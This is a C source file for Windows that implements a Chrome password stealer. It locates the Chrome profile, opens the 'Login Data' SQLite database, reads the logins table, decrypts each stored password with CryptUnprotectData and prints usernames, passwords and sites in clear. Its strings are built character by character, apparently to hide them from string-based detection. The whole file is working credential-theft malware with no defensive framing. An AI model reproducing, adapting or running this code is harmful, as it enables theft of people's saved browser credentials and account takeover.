#ifdef UNICODE
#undef UNICODE
#endif

#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <conio.h>
#include <Wincrypt.h>
#include <stdlib.h>
#include <stdio.h>
#include <memory.h>


#include "sqlite3.h"
#include "mem.h"
#include "misc.h"
#include "chrome.h"

#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")


LPSTR GetChromeProfilePath()
{
	char strFormat[] = { '%', 's', '\\', 'G', 'o', 'o', 'g', 'l', 'e', '\\', 'C', 'h', 'r', 'o', 'm', 'e', '\\', 'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a', '\\', 'D', 'e', 'f', 'a', 'u', 'l', 't', '\0' };
	LPSTR strPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	if (!SHGetSpecialFolderPath(NULL, strPath, CSIDL_LOCAL_APPDATA, FALSE))
		return NULL;

	LPSTR strFullPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	_snprintf_s(strFullPath, MAX_PATH, _TRUNCATE, strFormat, strPath);  //FIXME: array

	LPSTR strShortPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	if (!GetShortPathName(strFullPath, strShortPath, MAX_PATH) || !PathFileExists(strShortPath))
	{
		tfree(strShortPath);
		strShortPath = NULL;
	}

	tfree(strPath);
	tfree(strFullPath);

	if (PathFileExistsA(strShortPath))
		return strShortPath;

	return NULL;
}

LPSTR CrackChrome(PBYTE pass) {

	DATA_BLOB data_in, data_out;
	DWORD dwBlobSize;

	CHAR *decrypted;

	data_out.pbData = 0;
	data_out.cbData = 0;
	data_in.pbData = pass;

	for (dwBlobSize = 128; dwBlobSize <= 2048; dwBlobSize += 16)
	{
		data_in.cbData = dwBlobSize;
		if (CryptUnprotectData(&data_in, NULL, NULL, NULL, NULL, 0, &data_out))
			break;
	}

	if (dwBlobSize >= 2048)
		return NULL;

	LPSTR strClearData = (LPSTR)talloc((data_out.cbData + 1)*sizeof(char));
	if (!strClearData)
	{
		LocalFree(data_out.pbData);
		printf("chrome crack failed\n");
		return NULL;
	}

	//FIXFIXFIXFIX

	decrypted = (LPSTR)talloc((data_out.cbData + 1)*sizeof(char));
	memset(decrypted, 0, data_out.cbData);
	memcpy(decrypted, data_out.pbData, data_out.cbData);

	sprintf_s(strClearData, data_out.cbData + 1, "%s", decrypted);

	LocalFree(data_out.pbData);
	tfree(decrypted);
	return strClearData;
}

int chrome_worker(PVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPSTR strResource = NULL;
	LPSTR strUser = NULL; // (LPSTR) talloc(1024*sizeof(char));
	LPSTR strPass = NULL; // (LPSTR) talloc(1024*sizeof(char));

	CHAR strOrigin[] = { 'o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', 0x0 };
	CHAR strUserVal[] = { 'u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };
	CHAR strPassVal[] = { 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };

	CHAR strChrome[] = { 'C', 'h', 'r', 'o', 'm', 'e', 0x0 };
	for (DWORD i = 0; i < dwColumns; i++)
	{

		if (!strNames[i])
			continue;

		if (!strcmp(strNames[i], strOrigin))
		{
			strResource = (LPSTR)talloc(1024 * sizeof(char));
			//sprintf_s(strResource, 1024, "%S", strValues[i]);
			sprintf_s(strResource, 1024, "%s", strValues[i]);

		}
		else if (!strcmp(strNames[i], strUserVal))
		{
			strUser = (LPSTR)talloc(1024 * sizeof(char));
			sprintf_s(strUser, 1024, "%s", strValues[i]);
		}
		else if (!strcmp(strNames[i], strPassVal)){

			strPass = CrackChrome((PBYTE)strValues[i]);
		}
	}

	if (strResource && strUser && strPass && strlen(strResource) && strlen(strUser))
	{
		printf("CHROME => uname: %s\tpwd: %s\tsite: %s\n", strUser, strPass, strResource);
	}

	tfree(strResource);
	tfree(strUser);
	tfree(strPass);
	return 0;
}

VOID dump_chromesql_pass()
{
	LPSTR strProfilePath = GetChromeProfilePath();
	if (!strProfilePath)
		return;

	DWORD dwSize = strlen(strProfilePath) + 1024;
	LPSTR strFilePath = (LPSTR)talloc(dwSize);
	CHAR strFileName[] = { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', 0x0 };
	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);
	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
	{
		sqlite3_busy_timeout(lpDb, 5000); // FIXME
		CHAR strQuery[] = { 'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F', 'R', 'O', 'M', ' ', 'l', 'o', 'g', 'i', 'n', 's', ';', 0x0 };
		sqlite3_exec(lpDb, strQuery, chrome_worker, 0, NULL); // FIXME: char array

		sqlite3_close(lpDb);
	}

	tfree(strFilePath);
	tfree(strProfilePath);
}


VOID dump_chrome_passwords()
{
	dump_chromesql_pass();
}